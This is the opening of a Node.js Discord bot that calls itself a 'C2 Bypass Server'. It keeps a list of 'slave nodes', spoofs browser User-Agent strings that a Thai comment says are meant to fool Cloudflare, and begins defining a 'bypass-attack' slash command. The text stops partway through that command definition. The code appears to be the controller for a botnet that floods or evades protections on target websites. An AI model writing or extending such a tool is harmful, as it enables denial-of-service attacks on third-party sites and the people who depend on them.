const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('JARVIS Bypass Engine is running smoothly.');
});

server.listen(PORT, () => {
    console.log(`[+] C2 Bypass Server running on port ${PORT}`);
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// รายชื่อ User-Agents ปลอมตัวเนียนๆ เป็นเบราว์เซอร์จริงๆ เพื่อตบตา Cloudflare
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
];

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('bypass-attack')
            .setDescription('สั่ง
